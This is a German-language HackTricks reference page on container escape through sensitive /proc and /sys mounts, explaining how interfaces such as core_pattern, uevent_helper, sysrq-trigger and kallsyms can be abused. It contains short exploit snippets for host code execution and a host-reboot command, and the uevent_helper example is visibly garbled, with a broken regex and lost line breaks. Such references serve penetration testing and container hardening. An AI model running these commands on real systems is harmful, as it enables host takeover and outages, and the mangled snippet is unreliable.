# Sensible Mounts

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks in PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Die Offenlegung von `/proc` und `/sys` ohne ordnungsgemäße Namespace-Isolierung birgt erhebliche Sicherheitsrisiken, einschließlich einer Vergrößerung der Angriffsfläche und der Offenlegung von Informationen. Diese Verzeichnisse enthalten sensible Dateien, die bei falscher Konfiguration oder Zugriff durch einen nicht autorisierten Benutzer zu einem Container-Ausbruch, einer Host-Änderung oder zur Bereitstellung von Informationen führen können, die weitere Angriffe unterstützen. Beispielsweise kann das falsche Einhängen von `-v /proc:/host/proc` den AppArmor-Schutz aufgrund seiner pfadbasierten Natur umgehen und `/host/proc` ungeschützt lassen.

**Weitere Details zu jeder potenziellen Schwachstelle finden Sie unter** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs-Schwachstellen

### `/proc/sys`

Dieses Verzeichnis ermöglicht den Zugriff auf die Änderung von Kernelvariablen, normalerweise über `sysctl(2)`, und enthält mehrere Unterordner von Interesse:

#### **`/proc/sys/kernel/core_pattern`**

* Beschrieben in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Ermöglicht die Definition eines Programms, das bei der Generierung von Core-Dateien mit den ersten 128 Bytes als Argumenten ausgeführt wird. Dies kann zu einer Codeausführung führen, wenn die Datei mit einem Pipe `|` beginnt.
*   **Beispiel für Test und Ausnutzung**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test auf Schreibzugriff
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Benutzerdefinierten Handler festlegen
sleep 5 && ./crash & # Handler auslösen
```

#### **`/proc/sys/kernel/modprobe`**

* Ausführlich beschrieben in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Enthält den Pfad zum Kernelmodullader, der zum Laden von Kernelmodulen aufgerufen wird.
*   **Beispiel zur Überprüfung des Zugriffs**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Zugriff auf modprobe überprüfen
```

#### **`/proc/sys/vm/panic_on_oom`**

* Bezugnahme auf [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Ein globaler Schalter, der steuert, ob der Kernel bei einem OOM-Zustand in Panik gerät oder den OOM-Killer aufruft.

#### **`/proc/sys/fs`**

* Gemäß [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) enthält Optionen und Informationen zum Dateisystem.
* Schreibzugriff kann verschiedene Denial-of-Service-Angriffe gegen den Host ermöglichen.

#### **`/proc/sys/fs/binfmt_misc`**

* Ermöglicht die Registrierung von Interpretern für nicht native Binärformate basierend auf ihrer Magiezahl.
* Kann zu Privilegieneskalation oder Root-Shell-Zugriff führen, wenn `/proc/sys/fs/binfmt_misc/register` beschreibbar ist.
* Relevanter Exploit und Erklärung:
* [Rootkit auf einfache Art über binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Ausführliches Tutorial: [Video-Link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Andere in `/proc`

#### **`/proc/config.gz`**

* Kann die Kernelkonfiguration offenlegen, wenn `CONFIG_IKCONFIG_PROC` aktiviert ist.
* Nützlich für Angreifer, um Schwachstellen im laufenden Kernel zu identifizieren.

#### **`/proc/sysrq-trigger`**

* Ermöglicht das Auslösen von Sysrq-Befehlen, die potenziell sofortige Systemneustarts oder andere kritische Aktionen verursachen können.
*   **Beispiel für das Neustarten des Hosts**:

```bash
echo b > /proc/sysrq-trigger # Startet den Host neu
```

#### **`/proc/kmsg`**

* Stellt Kernel-Ringpuffermeldungen bereit.
* Kann bei Kernel-Exploits, Adresslecks und der Bereitstellung sensibler Systeminformationen helfen.

#### **`/proc/kallsyms`**

* Listet exportierte Kernel-Symbole und deren Adressen auf.
* Wesentlich für die Entwicklung von Kernel-Exploits, insbesondere zur Überwindung von KASLR.
* Adressinformationen sind mit `kptr_restrict` auf `1` oder `2` beschränkt.
* Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Interagiert mit dem Kernel-Speichergerät `/dev/mem`.
* Historisch anfällig für Privilegienerweiterungsangriffe.
* Mehr unter [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Stellt den physischen Speicher des Systems im ELF-Core-Format dar.
* Das Lesen kann den Speicherinhalt des Hostsystems und anderer Container preisgeben.
* Eine große Dateigröße kann zu Leseproblemen oder Softwareabstürzen führen.
* Detaillierte Verwendung in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Alternative Schnittstelle für `/dev/kmem`, die den virtuellen Kernel-Speicher darstellt.
* Ermöglicht das Lesen und Schreiben, daher die direkte Modifikation des Kernel-Speichers.

#### **`/proc/mem`**

* Alternative Schnittstelle für `/dev/mem`, die den physischen Speicher darstellt.
* Ermöglicht das Lesen und Schreiben, die Modifikation des gesamten Speichers erfordert die Auflösung virtueller in physische Adressen.

#### **`/proc/sched_debug`**

* Gibt Informationen zur Prozessplanung zurück und umgeht PID-Namensraumschutzmaßnahmen.
* Stellt Prozessnamen, IDs und cgroup-Identifikatoren offen.

#### **`/proc/[pid]/mountinfo`**

* Bietet Informationen über Einhängepunkte im Einhängepunkt-Namensraum des Prozesses.
* Offenbart den Speicherort des Container-`rootfs` oder des Images.

### sys-Schwachstellen

#### **`/sys/kernel/uevent_helper`**

* Wird zur Behandlung von Kernelgeräte-`uevents` verwendet.
* Das Schreiben in `/sys/kernel/uevent_helper` kann beliebige Skripte bei `uevent`-Auslösern ausführen.
*   **Beispiel für Ausnutzung**: %%%bash

## Erstellt ein Payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

## Ermittelt den Hostpfad aus dem OverlayFS-Einhängepunkt für den Container

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

## Setzt uevent\_helper auf bösartigen Helfer

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

## Löst ein uevent aus

echo change > /sys/class/mem/null/uevent

## Liest die Ausgabe

cat /output %%%
#### **`/sys/class/thermal`**

* Steuert Temperatureinstellungen, die potenziell DoS-Angriffe oder physische Schäden verursachen können.

#### **`/sys/kernel/vmcoreinfo`**

* Gibt Kernel-Adressen preis, was potenziell die KASLR gefährden kann.

#### **`/sys/kernel/security`**

* Beherbergt die `securityfs`-Schnittstelle, die die Konfiguration von Linux Security Modules wie AppArmor ermöglicht.
* Der Zugriff könnte einem Container ermöglichen, sein MAC-System zu deaktivieren.

#### **`/sys/firmware/efi/vars` und `/sys/firmware/efi/efivars`**

* Bietet Schnittstellen zur Interaktion mit EFI-Variablen im NVRAM.
* Falsche Konfiguration oder Ausnutzung kann zu unbrauchbaren Laptops oder nicht bootfähigen Host-Maschinen führen.

#### **`/sys/kernel/debug`**

* `debugfs` bietet eine "keine Regeln" Debugging-Schnittstelle zum Kernel.
* Geschichte von Sicherheitsproblemen aufgrund seiner uneingeschränkten Natur.

### Referenzen

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
